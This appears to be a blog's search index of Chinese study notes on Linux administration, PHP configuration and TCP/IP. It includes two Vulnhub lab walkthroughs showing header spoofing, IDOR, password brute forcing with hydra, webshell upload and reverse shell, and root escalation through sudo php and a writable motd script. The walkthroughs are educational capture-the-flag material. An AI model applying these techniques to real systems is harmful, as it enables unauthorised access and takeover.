<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Linux基础</title>
    <url>/2021/08/26/Linux%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<p>Linux基础</p>
<p>2021年5月12日</p>
<p>21:02</p>
<p>快捷键与命令</p>
<span id="more"></span>

<p>Poweroff  关机</p>
<p>Reboddot   重启</p>
<p>Pwd   —-当前目录</p>
<p>ctrl+l  —-清屏  </p>
<p>File —-查看文件信息</p>
<p>Man 命令 —帮助手册</p>
<p>Du —–查看目录信息</p>
<p>服务</p>
<p>systemctl –type=service  ——查看所有服务状态</p>
<p>service xxx start  ——-启动服务</p>
<p>ss -antpl                   —–查看端口</p>
<p>systemctl stop firewalld.service  —–关闭防火墙</p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20210826155402.png" alt="操作系统文件类型"></p>
<p>文件类型</p>
<p>蓝色–目录</p>
<p>黑色–普通文件</p>
<p>浅蓝色–符号链接(快捷方式)</p>
<p>黑底黄字—设备文件 硬盘 Sda</p>
<p>绿色—-有执行权限文件</p>
<p>红色—-压缩包</p>
<p>紫色—图片 模块文件</p>
<p>/bin 普通用户与管理员都可运行的命令</p>
<p>/sbin 只有管理员运行 关机重启</p>
<p>/boot 引导主引导目录 独立的分区 启动菜单 内核</p>
<p>/dev device设备 设备文件存放目录</p>
<p>/etc 配置文件目录</p>
<p>/home 普通用户家</p>
<p>/root 管理员家</p>
<p>/media 光驱的挂载目录</p>
<p>/mnt 临时设备挂载目录 U盘</p>
<p>/proc 数据在内存中，进程所在目录</p>
<p>/tmp 临时文件目录</p>
<p>/usr 软件按照目录</p>
<p>/var 常变文件存放目录，日志，邮件</p>
<p>增删改查</p>
<p>查询: 目录下文件  文件中内容</p>
<p>Ls   cat </p>
<p>Ls - a  隐藏文件</p>
<p><code>    </code>-l 详细信息</p>
<p><code>    </code>-h 人性化信息</p>
<p><code>    </code>-R 递归显示</p>
<p>创建： 创建文件 目录 符号链接</p>
<p>Touch  文件名  </p>
<p>Echo “hello” &gt; 文件</p>
<p>Mkdir 目录</p>
<p>Ln -s 绝对路径源文件 建立的链接文件</p>
<p>改：剪切，复制</p>
<p>Mv 剪切，改名</p>
<p>Cp  复制</p>
<p>删除</p>
<p>rm 删除 -f 强制删除 -r 递归删除目录</p>
<p>压缩</p>
<p>Gzip 文件名称 解压 gunzip 文件名称</p>
<p>Bzip2 文件名称  解压 bunzip2 文件名称</p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20210826155418.png" alt="目录打包工具"></p>
<p>目录打包工具</p>
<p>Tar -cf 新文件目录 源文件目录</p>
<p>-tvf 不解包情况下观看包情况</p>
<p>内部命令： 命令解释器自带命令 help cd</p>
<p>外面命令:  外部应用携带命令 man ls</p>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux日志基础</title>
    <url>/2021/08/28/Linux%E6%97%A5%E5%BF%97%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<p>Linux日志基础</p>
<p>2021年8月28日</p>
<p>17:36</p>
<span id="more"></span>

<h2 id="网络信息查看与配置"><a href="#网络信息查看与配置" class="headerlink" title="网络信息查看与配置"></a><strong>网络信息查看与配置</strong></h2><h3 id="临时配置"><a href="#临时配置" class="headerlink" title="临时配置"></a><strong>临时配置</strong></h3><p>ip addr 确认系统网卡信息</p>
<p>service NetworkManager stop 关闭networkmanager服务</p>
<p>ip addr add 10.1.1.101/24 dev eth0 暂时配置网络地址</p>
<p>ip route addr default via 10.1.1.1 dev eth0 暂时配置网关</p>
<h2 id="日志管理"><a href="#日志管理" class="headerlink" title="日志管理"></a><strong>日志管理</strong></h2><p>目录</p>
<p>/var/log</p>
<h3 id="日志分类"><a href="#日志分类" class="headerlink" title="日志分类"></a><strong>日志分类</strong></h3><p>系统日志</p>
<p>登录日志         secure</p>
<p>程序日志</p>
<h3 id="日志服务配置文件"><a href="#日志服务配置文件" class="headerlink" title="日志服务配置文件"></a><strong>日志服务配置文件</strong></h3><p>/etc/rsyslog.conf</p>
<p>*.info;mail.none;authpriv.none;cron.none /var/log/messages</p>
<p>a.b</p>
<p>a:表示日历内容 , b:表示日志级别   /xx/x表示记录位置</p>
<h3 id="日志异地备份"><a href="#日志异地备份" class="headerlink" title="日志异地备份"></a><strong>日志异地备份</strong></h3>]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux帐户安全</title>
    <url>/2021/08/26/Linux%E5%B8%90%E6%88%B7%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<p>Linux帐号安全</p>
<p>2021年8月26日</p>
<p>16:12</p>
<h2 id="linux中用户分类及信息保存位置"><a href="#linux中用户分类及信息保存位置" class="headerlink" title="linux中用户分类及信息保存位置"></a><strong>linux中用户分类及信息保存位置</strong></h2><ul>
<li>Root超级管理员</li>
<li>普通用户 :权限比管理员低也可以登录系统<span id="more"></span></li>
<li>程序用户   ：无法登录系统</li>
</ul>
<h3 id="用户分类和组信息"><a href="#用户分类和组信息" class="headerlink" title="用户分类和组信息"></a><strong>用户分类和组信息</strong></h3><h4 id="etc-passwd-保存了系统中所有用户信息"><a href="#etc-passwd-保存了系统中所有用户信息" class="headerlink" title="/etc/passwd 保存了系统中所有用户信息"></a><em><strong>/etc/passwd 保存了系统中所有用户信息</strong></em></h4><p><code> </code>root : x : 0 : 0: root : /root : /bin/bash</p>
<p><code> </code>字段1:用户名</p>
<p><code> </code>字段2:密码占位符</p>
<p><code> </code>字段3:用户uid 0表示超级用户 500-60000普通用户 , 1-499程序用户：无法登录系统<br><code>  </code>字段4: 组gid  先有组才有用户        </p>
<p><code> </code>字段5:用户信息记录字段</p>
<p><code> </code>字段6:用户家目录</p>
<p><code> </code>字段7:用户登录系统后使用命令解释器</p>
<h4 id="etc-shadow保存用户密码信息"><a href="#etc-shadow保存用户密码信息" class="headerlink" title="/etc/shadow保存用户密码信息"></a><em><strong>/etc/shadow保存用户密码信息</strong></em></h4><p>root : $6$V8sVLSI7G4vw7YzND3gJANtFD1NkbY4. : : 0 :99999:7: : :</p>
<p>字段1:用户名</p>
<p>字段2:密码  SHA-512</p>
<p>字段3:距离1970/1/1密码最近一次修改时间</p>
<p>字段4:密码最短有效期</p>
<p>字段5:密码最长有效期 建议为90天</p>
<p>字段6:密码过期前7天警告</p>
<p>字段7:密码不活跃期</p>
<p>字段8:用户失效时间</p>
<h4 id="etc-group-系统所有组信息"><a href="#etc-group-系统所有组信息" class="headerlink" title="/etc/group 系统所有组信息"></a><em><strong>/etc/group 系统所有组信息</strong></em></h4><p>root:x:0: </p>
<h2 id="建立及调整组用户属性"><a href="#建立及调整组用户属性" class="headerlink" title="建立及调整组用户属性"></a><strong>建立及调整组用户属性</strong></h2><h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a><strong>命令</strong></h3><p>groupadd xxx 添加组</p>
<p>groupmod -g 1000 xxxx 修改组gid</p>
<p>groupadd -g 2000 yyyy 建立组gid 2000</p>
<p>useradd -g xxxx or 1000 tom 建立用户属于组1000</p>
<p>id tom       查看用户信息</p>
<p>usermod -G 2000 or yyyy tom -u 600 tom  -G添加附加组 -u 修改uid</p>
<p>useradd -u 250 -M -s /sbin/nologin testuser  -M没有家目录2 -s指定命令解释器</p>
<p>passwd tom   设置密码</p>
<p>change -M  90 tome  设置密码最长有效期 90天</p>
<p>passwd -S tom 用户密码信息</p>
<p>passwd -l tom 锁定用户禁止登录</p>
<p>passwd -u tom 解锁用户</p>
<p>userdel -r tom 删除用户  -r删除家目录</p>
<p>groupdel xxxx  删除组</p>
<h2 id="设置文件目录权限"><a href="#设置文件目录权限" class="headerlink" title="设置文件目录权限"></a><strong>设置文件目录权限</strong></h2><h3 id="权限解释"><a href="#权限解释" class="headerlink" title="权限解释"></a><strong>权限解释</strong></h3><p>-rw-r–r–. 1(当前几个节点) root(所属者) root(所属组) test.txt文件</p>
<p>drwxr-xr-x. 2 root root  Downloads/ 目录</p>
<p>- rw- r– r– .</p>
<p>d rwx r-x r-x .</p>
<p>字段1:文件类型 -普通文件 d目录 l符号链接 b块设备</p>
<p>字段2:文件所属者对文件的权限</p>
<p>r                           w                  x</p>
<p>文件: read读取文件 write写文件 可执行权限</p>
<p>目录: read查看目录  增删文件      进入目录</p>
<p>字段3:文件所属组权限</p>
<p>字段4:其他用户权限0</p>
<p>粘滞位 sgid suid 权限</p>
<p>粘滞位针对目录进行赋权,目录中创建文件只有建立者可以删除 ：一般在tem目录中具有</p>
<p>sgid 针对目录建立的权限，在该目录中建立文件所属组权限继承父目录</p>
<p>suid 对可执行文件建立权限，谁执行该文件，具有该文件所属者权限</p>
<h3 id="命令-1"><a href="#命令-1" class="headerlink" title="命令"></a><strong>命令</strong></h3><p>查看文件权限 ls -l</p>
<p>查看目录权限 ls -ld</p>
<p>chmod 对象 算术运算符 权限 文件     :改变文件权限</p>
<p>用户: u (所属者) g(所属组) o（其他用户） a(all)</p>
<p>算术运算符: - + =</p>
<p>权限: r w x</p>
<p>chown 用户 文件   :改变所属用户</p>
<p>chgrp 组 文件         :改变所属组</p>
<p>chmod 764 test.txt</p>
<p>7:8进制赋权 111 所属者</p>
<p>6:                   001 所属组</p>
<p>4:                    010 其他用户</p>
<p>chmod o +t 粘滞位权限</p>
<p>chmod o+s suid 权限</p>
<h2 id="安全相关指令"><a href="#安全相关指令" class="headerlink" title="安全相关指令"></a><strong>安全相关指令</strong></h2><h3 id="命令-2"><a href="#命令-2" class="headerlink" title="命令"></a><strong>命令</strong></h3><p>chattr +i /etc/passwd /etc/shadow :文件不可更改</p>
<p>umask 权限掩码   0022   创建 0777-0022 =  0755</p>
<p>在/etc/profile 和 /etc/bashrc中更改</p>
<p>/etc/login.defs 用户有关密码信息默认配置信息</p>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux软件安装</title>
    <url>/2021/08/26/Linux%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<p>Linux软件安装</p>
<p>2021年8月26日</p>
<p>15:21</p>
<h3 id="linux软件分类"><a href="#linux软件分类" class="headerlink" title="linux软件分类"></a><strong>linux软件分类</strong></h3><p>源码包</p>
<p>封装后的软件包</p>
<span id="more"></span>

<p>在GNU社区下载</p>
<h4 id="源码包特点"><a href="#源码包特点" class="headerlink" title="源码包特点"></a><em><strong>源码包特点</strong></em></h4><ul>
<li>以压缩包形式提供</li>
<li>开源</li>
</ul>
<h4 id="安装压缩包的注意事项"><a href="#安装压缩包的注意事项" class="headerlink" title="安装压缩包的注意事项"></a><em><strong>安装压缩包的注意事项</strong></em></h4><ul>
<li>解包</li>
<li>编译 可以指定安装路径和编译所需功能</li>
<li>通过配置脚本指定安装路径和功能，并且生成makefile编译脚本文件</li>
<li>通过make命令控制makefile进行编译</li>
<li>makeinstall</li>
<li>将编译好的文件拷贝到安装路径下</li>
</ul>
<h5 id="封装软件包特点"><a href="#封装软件包特点" class="headerlink" title="封装软件包特点"></a><strong>封装软件包特点</strong></h5><p>后缀：rpm :red hat package manager只能在red hat上安装</p>
<p><code>    </code>deb : Debian                                  只能在Debian上安装</p>
<h4 id="安装封装软件包注意事项"><a href="#安装封装软件包注意事项" class="headerlink" title="安装封装软件包注意事项"></a><em><strong>安装封装软件包注意事项</strong></em></h4><ul>
<li>是否安装过该软件</li>
</ul>
<p>rpm-qa 列出所有安装过的rpm软件包</p>
<ul>
<li>确认该软件作用</li>
</ul>
<p>rpm -qpi xxxx.rpm</p>
<ul>
<li>确认软件安装路径</li>
</ul>
<p>rpm -qpl xxxx.rpm</p>
<ul>
<li>安装软件</li>
</ul>
<p>rpm -ivh xxx.rpm</p>
<ul>
<li>卸载软件</li>
</ul>
<p>rpm -e xxx</p>
<h4 id="根据光盘中依赖关系列表进行软件安装卸载-yum源安装"><a href="#根据光盘中依赖关系列表进行软件安装卸载-yum源安装" class="headerlink" title="根据光盘中依赖关系列表进行软件安装卸载(yum源安装)"></a><em><strong>根据光盘中依赖关系列表进行软件安装卸载(yum源安装)</strong></em></h4><ul>
<li>告诉操作系统依赖关系列表位置</li>
<li>通过yum工具进行软件卸载与安装</li>
</ul>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Me-and-My-girlfriend-1靶机</title>
    <url>/2021/08/31/Me-and-My-girlfriend-1%E9%9D%B6%E6%9C%BA/</url>
    <content><![CDATA[<h3 id="靶场简介"><a href="#靶场简介" class="headerlink" title="靶场简介"></a>靶场简介</h3><p>下载地址：<a href="https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/">ME AND MY GIRLFRIEND: 1</a><br>目标:取得两个flag</p>
<span id="more"></span>
<p>用户:alice</p>
<h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>VM2015<br>网上都是说选择NAT模式，尝试了一下在VM中选择VM1网段，但是用namp扫描不到。在虚拟机编辑选项里选择<strong>虚拟网络编辑器</strong>手动修改为启用DHCP，且将子网地址修改为与真实机相同网段后重启,再跑nmap就扫描到了。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20210831222907.png" alt="虚拟机网络配置修改"></p>
<h3 id="正题"><a href="#正题" class="headerlink" title="正题"></a>正题</h3><p>先用nmap跑10.1.1网段，发现10.1.1.128开启22 和 80端口。明显一个网页服务一个SSH。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20210831223129.png" alt="nmap扫描结果"><br>访问80端口显示仅由local本地地址可以进入。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20210831223309.png" alt="网页结果"><br>查看源码后出现&lt;!– Maybe you can search how to use x-forwarded-for –&gt;提示。<br>搜了一下x-forwarded-for是记录最初的客户端ip以及后续代理ip。<br>语法:X-Forwarded-For: <client>, <proxy1>, <proxy2><br>很明显是通过伪造X-Forwarded-For为本地ip访问网站。<br>通过firefox Hackbar插件添加请求头 x-forwarded-for: 127.0.0.1，后即可正常访问。<br>进入网页后注册帐号，在profil页面发现通过GET方式user_id = 12，获得个人信息，尝试改变user_id是否可能获得其他人的帐号信息。<br>当我们输入id = 5时，用户名为alice,但是在密码页面无法直接看到，直接F12查看元素获得密码为:4lic3<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20210831224349.png" alt="密码"></p>
<p>用alice和 4lic3ssh连接，在/home/alice下存在隐藏文件._secret，进入文件夹后获得flag1.txt，然后通过命令sudo -l 发现 可以不使用密码 通过root权限使用php。<br>sudo php - r 使用root权限执行php命令，构造任意命令执行获得root权限.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo php -r <span class="string">&quot;system(&#x27;/bin/bash&#x27;);&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#在 root 下搜索flag</span></span><br><span class="line"></span><br><span class="line">find / -name <span class="string">&quot;flag*.txt&quot;</span></span><br><span class="line"><span class="comment">#获得两个flag</span></span><br><span class="line">/root/flag2.txt</span><br><span class="line">/home/alice/.my_secret/flag1.txt</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>靶场</tag>
        <tag>Vulnhub</tag>
        <tag>Linux提权</tag>
      </tags>
  </entry>
  <entry>
    <title>NARAK靶机</title>
    <url>/2021/12/12/NARAK%E9%9D%B6%E6%9C%BA/</url>
    <content><![CDATA[<h1 id="靶场简介"><a href="#靶场简介" class="headerlink" title="靶场简介"></a>靶场简介</h1><p>靶机地址：<a href="https://www.vulnhub.com/entry/ha-narak,569/">NARAK</a><br>目标:user.txt , root.txt</p>
<span id="more"></span>


<h1 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h1><p>使用namp 扫描10.1.1.0/24网段，发现靶机地址为10.1.1.129。<br>开放22端口和80端口。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211212160132.png" alt="靶机扫描"><br>进入网页后发现，都是图片没有什么有用的信息。<br>使用dirb扫描靶机后发现存在三个目录<br><code>dirb http://10.1.1.129</code></p>
<ul>
<li>/index.html</li>
<li>/server-startus</li>
<li>/webdav</li>
</ul>
<p>index为主页，server-startus没有足够的权限，webdav需要帐号密码才能够查看。目前来看唯一可行的只有通过webdav进入。<br>使用cewl 对index网页进行爬虫，得到可能的密码字典，然后使用hydra进行爆破尝试.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cewl -w password.txt http://10.1.1.129</span><br><span class="line">hydra -L password.txt -P password.txt 10.1.1.129 http-get /webdav</span><br></pre></td></tr></table></figure>

<p>得到 yamdoot:Swarg账户。尝试之后无法使用ssh登录。使用cadaver 连接webdav,然后put一个webshell进去。反弹shell后，使用<code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code>得到一个交互式bash窗口。  </p>
<p>但是我们只有www-data权限，到home后我们得到了 inferno narak yamdoot 三个用户，试试用之前的密码连接全部失败了.又尝试进入mnt中发现有一个hell.sh文件，其中的内容为<br>    echo”Highway to Hell”;<br>    –[—–&gt;+&lt;]&gt;—.+++++.+.+++++++++++.–.+++[-&gt;+++&lt;]&gt;++.++++++.–[—&gt;+&lt;]&gt;–.—–.++++.</p>
<p>其中的信息使用了brainfuck进行加密，到<a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a> 进解码后，得到了 <strong>chitragupt</strong> 。<br>再次尝试使用三个帐号登录，这一次inferno帐号登录成功我们在home中得到了user.txt.很明显root.txt需要提权后得到。<br>使用motc提权</p>
<ol>
<li>进入文件夹 /etc/update-motd.d/</li>
<li>修改文件 echo “echo ‘root:admin2’|sudo chpasswd” &gt;&gt; 00-header</li>
<li>重新登录</li>
<li>su root 密码为admin</li>
</ol>
<p>其中00-header文件的执行权限为root，但是我们可以对它进行修改意味着当文件执行时可以用root权限运行。00-header文件相当于登录的欢迎文件，当我们重新登录时 附加进的 echo ‘root:admin’|sudo chpasswd相当于使用root权限进行 chpasswd命令，而 | 前的相当于指令的输入，因此root的密码被修改为admin。从而获得root权限<br>在root文件夹中获得root.txt。</p>
<hr>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>靶场</tag>
        <tag>Vulnhub</tag>
        <tag>Linux提权</tag>
        <tag>爬虫字典</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP核心配置</title>
    <url>/2021/09/04/PHP%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>PHP核心配置</p>
<span id="more"></span>

<p>2021年7月13日</p>
<p>10:58</p>
<ul>
<li>配置的可修改范围</li>
</ul>
<p>PHP_INI_USER        可在用户脚本（例如 ini_set()）或 Windows 注册表（自 PHP 5.3 起）以及 .user.ini 中设定 </p>
<p>PHP_INI_PERDIR        可在 php.ini，.htaccess 或 httpd.conf 中设定</p>
<p>PHP_INI_SYSTEM        可在 php.ini 或 httpd.conf 中设定</p>
<p>PHP_INI_ALL        可在任何地方设定</p>
<p>php.ini only    仅在php.ini中设置</p>
<ul>
<li>核心配置选项<ul>
<li>register_globals</li>
</ul>
</li>
</ul>
<p>说明:该选项在on情况下，会将用户GET,POST提交上的参数自动注册为全局变量，并且初始化为对应的值。</p>
<p>版本变换:PHP &lt;= 4.2.3范围为PHP_INI_ALL, 在PHP5.3.0开始默认关闭 ， PHP 5.4.0移除该选项。</p>
<p>例子:</p>
<?php

if($user=admin)

echo 123;

?>

<p>xx.php?user=admin运行时会输出123</p>
<ul>
<li>allow_url_include</li>
</ul>
<p>说明:开启情况下，运行包含远程文件.</p>
<p>版本变化: PHP 5.2.0后默认关闭</p>
<ul>
<li>magic_quotes_gpc</li>
</ul>
<p>说明:开启后会在GET , POST, COOKIE 变量中 ‘ “  \ null 字符前加入,但是并不会过滤$_SERVER变量。</p>
<p>版本变化:PHP 5.3后默认关闭 , 5.4之后取消 ， 在&lt;=4.2.3时,配置范围为 PHP_INI_ALL</p>
<ul>
<li>magic_quotes_runtime</li>
</ul>
<p>说明:与_gpc相同，只不过只对文件和数据库中获取的数据转义。</p>
<p>版本变化:5.4后取消</p>
<p>特点:只有部分函数受影响</p>
<ul>
<li>magic_quotes_sybase</li>
</ul>
<p>说明:会将GET,POST, Cookie的传递的单引号(‘)变为(“)，并转义null字符.</p>
<p>配置范围: PHP_INI_ALL</p>
<p>版本: 5.4.0后移除</p>
<p>特点:当开启后会覆盖_gpc = on;</p>
<ul>
<li>safe_mode(安全模式)</li>
</ul>
<p>配置范围:PHP_INI_SYSTEM</p>
<p>版本: 5.4.0之后被取消</p>
<p>说明:</p>
<ul>
<li><p>所有文件操作会受限制</p>
</li>
<li><p>popen(), system(), exec()等命令执行函数会受限制</p>
</li>
<li><p>open_basedir</p>
</li>
</ul>
<p>说明:限制PHP可以访问的目录</p>
<p>配置范围:&lt;2.2.3 PHP_INI_SYSTEM ，  &gt;= 5.2.3 PHP_INI_ALL</p>
<p>特点:对于目录要以/闭合，如 open_basedir = www/a,那么可以访问www/a 和www/b。</p>
<p>因此合理的写法为www/a/</p>
<ul>
<li>diable_functions</li>
</ul>
<p>说明:禁止php函数应用</p>
<p>范围:php.ini</p>
<ul>
<li>display_errors  , error_reporting</li>
</ul>
<p>说明:关闭 _errors关闭会取消错误显示，当开启时配合_reporting可以控制错误显示级别.</p>
<p>配置范围:PHP_INI_ALL</p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>Tcp_ip协议 12.1解决传输错误</title>
    <url>/2021/08/23/Tcp_ip%E5%8D%8F%E8%AE%AE%2012.1%E8%A7%A3%E5%86%B3%E4%BC%A0%E8%BE%93%E9%94%99%E8%AF%AF/</url>
    <content><![CDATA[<p>12.1解决传输错误</p>
<p>2021年7月25日</p>
<p>21:57</p>
<h2 id="大纲"><a href="#大纲" class="headerlink" title="大纲"></a>大纲</h2><p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20210824133311.png" alt="大纲"></p>
<ul>
<li>问题提出与解决方案：</li>
</ul>
<p>在IP在路由中多级传输的过程时，我们会遇到诸如分组丢失，或者信息错误的问题。为了解决问题，可以使用数学上的通过冗余纠错。或者直接简单的尝试重复传递指定接收方到正确为止。这种方法称为ARQ(Automatic Repeat Request)</p>
<span id="more"></span>




<ul>
<li>解决方案正确性</li>
</ul>
<p>但是为了保证ARQ正确我们需要判断以下两个条件</p>
<ul>
<li>接收方是否收到分组</li>
<li>接收方收到分组是否与之前相同</li>
</ul>
<p>因此我们引入了ACK。</p>
<ul>
<li>ACK<ul>
<li>基本定义</li>
</ul>
</li>
</ul>
<p>为了解决以上两个问题接收方在接收到分组之后，需要向对方发送信确认接收。这种方法称为ACK(ackonwledgement)。</p>
<ul>
<li>实现方式</li>
</ul>
<p>发送方发送分组后等待ACK，直到接对方发送的对应ACK继续发送下一个分组。</p>
<p>但是这又引发了三个问题</p>
<ul>
<li>等待时间应该为多长</li>
<li>ACK同样可能丢失</li>
<li>分组接收到了，但是存在错误</li>
</ul>
<p>解决方法</p>
<ul>
<li>见14章现在，暂时不谈。</li>
<li>如果分组丢失，接收方无法发送ACK，发送方等同接收方未收到，会再次发送。但是这会使接收方获得同一份分组的多个拷贝。</li>
<li>通过前面的校验码验证错误，当错误时不发送ACK，直到发送方发送无措分组。</li>
</ul>
<p>通过ACK现在，我们可以确认接收方收到分组的正确。但是有可能收到多个相同分组。</p>
<p>我们可以使用序列号解决相同分组的问题，通过发送方唯一标识的序列号，接收方判断是否已经接收，如果接收则丢弃。</p>
<p>现在我们解决了正确性的问题，但是在时间上新的问题又出现了。由于每次分组都需要等待确认后，再发送下一个分组时间效率很低。因此我们需要同时在网络中发送多个分组，而由这新的问题又再次产生。</p>
<p>发送方需要确认同一时间应该在网络中保持多少分组正在发送，确认接收方发送分组的计时器应该是多少，需要保存多少副本以供分组丢失时以供重新传递。</p>
<p>同时接收方也需要判断接收分组的先后顺序，如果接收方或者路由器处理速度不够导致分组来不及处理就丢弃等问题。</p>
<p>为了解决所有的问题我们引入了分组窗口与滑动窗口。</p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20210824133713.png" alt="滑动窗口"></p>
<ul>
<li>分组窗口与滑动窗口</li>
</ul>
<p>分组窗口定义：作为发送方已经发送但是还没有得到接收方ACK确认的分组的集合.</p>
<p>窗口大小：分组集合的大小。</p>
<p>通过右图我们可以观察到，在窗口左边的分组确认接收方已经收到，我们可以将对应的副本释放，而窗口右边则是仍未发送的分组。</p>
<p>每当发送方接收到一个分组ACK确认已经收到分组后，这整个窗口可以向右移动一位。因此这个协议也称为 <strong>滑动窗口协议</strong></p>
<ul>
<li>内存问题的解决</li>
</ul>
<p>通过滑动窗口发送方确认了对应内存的释放与分配，同时在接收方同样存在一个滑动窗口，在滑动窗口左侧的数据包已经被接受，中间的数据包正在等待接收，而右边的数据包既是接收了与会因为内存的限制而丢弃。</p>
<ul>
<li>变量窗口：流量和拥塞控制<ul>
<li>流量控制：</li>
</ul>
</li>
</ul>
<p>接收方通过发送一个与ACK一同传递的值W，告诉发送方应该实时调整窗口大小来保证接收方处理数据的效率与发送方匹配。而发送方在接收到ACK同时一起接收到了W,在窗口滑动的同时就调整了窗口大小。</p>
<ul>
<li>拥塞控制</li>
</ul>
<p>通过<strong>明确</strong>发信W我们保证了，发送方与接收方保持一致，但是在路由器的处理数度我们无法确认，因此我们需要一个<strong>隐形发信</strong>–涉及其他证据来决定减慢速度。这称为拥塞控制。详见16章</p>
<ul>
<li>关于重传超时的设定</li>
</ul>
<p>我们实时可以获取RTT(往返时间)作为平均值来判断是否重传，但是作为平均值通过它来判断，明显是不合理的可以遇见会有大量的数据包因为超时而重传。但是超时时间应该设定大于平均值多少在14章进一步讨论。</p>
]]></content>
      <categories>
        <category>网络</category>
      </categories>
      <tags>
        <tag>网络</tag>
        <tag>tcp/ip</tag>
      </tags>
  </entry>
  <entry>
    <title>Tcp_ip协议 12.2TCP的引入</title>
    <url>/2021/09/03/Tcp_ip%E5%8D%8F%E8%AE%AE%2012.2TCP%E7%9A%84%E5%BC%95%E5%85%A5/</url>
    <content><![CDATA[<p>12.2 TCP的引入</p>
<span id="more"></span>

<p>2021年9月3日</p>
<p>21:05</p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20210903213842.png" alt="TCP头部在数据包中封装"></p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20210903213934.png" alt="TCP头部信息"></p>
<ul>
<li>TCP头部包含源端口和目标端口。端口和IP唯一标识了每个TCP连接，端口IP的组合有时被称为socket。   4字节</li>
<li>序列号标记了这一段信息中第一个字节的编号 4字节</li>
<li>ACK(确认号)为最后接收到的字节的序列号+1.  4字节</li>
<li>头部长度以32位字(4字节)为单位确定4位标识位，TCP头部最多带60字节头部.   头部长度加上保留 共 1字节</li>
<li>8种状态位     1字节</li>
<li>窗口大小      2字节</li>
<li>TCP校验      2字节</li>
<li>紧急指针      2字节 //仅在URG字段设置时有效</li>
</ul>
<ol>
<li>SYN状态位，在建立连接时使用</li>
<li>FIN状态位, 当关闭连接时使用</li>
</ol>
]]></content>
      <categories>
        <category>网络</category>
      </categories>
      <tags>
        <tag>网络</tag>
        <tag>tcp/ip</tag>
      </tags>
  </entry>
  <entry>
    <title>Tcp_ip协议 13.2连接的建立和终止</title>
    <url>/2021/09/06/Tcp_ip%E5%8D%8F%E8%AE%AE%2013.2%E8%BF%9E%E6%8E%A5%E7%9A%84%E5%BB%BA%E7%AB%8B%E5%92%8C%E7%BB%88%E6%AD%A2/</url>
    <content><![CDATA[<h1 id="13-2-TCP-IP连接的建立和终止"><a href="#13-2-TCP-IP连接的建立和终止" class="headerlink" title="13.2 TCP_IP连接的建立和终止"></a>13.2 TCP_IP连接的建立和终止</h1><span id="more"></span>

<h2 id="连接建立"><a href="#连接建立" class="headerlink" title="连接建立"></a>连接建立</h2><p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20210906220930.png" alt="建立连接"></p>
<ol>
<li>主动开启者发送报文，包含初始序列号ISN_c,SYN位表示想要建立TCP连接</li>
<li>服务器SYN报文seq = $INS_x$, ACK=$INS_c$+1，表示服务器确认建立连接。此时<strong>服务器</strong>知道<strong>服务器接受</strong>功能无问题、<strong>客户端发送</strong>无问题</li>
<li>客户端发送ACK报文，seq = $INS_c+1$, ACK = $INS_x+1$。当客户端接受到2号报文时，<strong>客户端</strong>确认<strong>双方发送接受</strong>均无问题。当<strong>服务端</strong>接受到报文3时确认<strong>服务端发送客户端接受</strong>无问题。</li>
</ol>
<h2 id="连接关闭"><a href="#连接关闭" class="headerlink" title="连接关闭"></a>连接关闭</h2><p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20210906221028.png" alt="连接关闭"></p>
<ol>
<li>主动开启者发送    Fin段以及$Seq = k, ACK = L$。表示想要关闭连接。</li>
<li>被动开启者发送 $Seq = L, ACK = k+1$，表示接收到关闭帧。</li>
<li>如果有数据还需要发送，进行剩余的数据发送</li>
<li>被动开启者发送$Fin Seq = L , ACK = k+1$，表示关闭连接。</li>
<li>主动开启者发送$Seq = k+1，  ACK = L+1 $，接收到被动方的连接关闭。</li>
</ol>
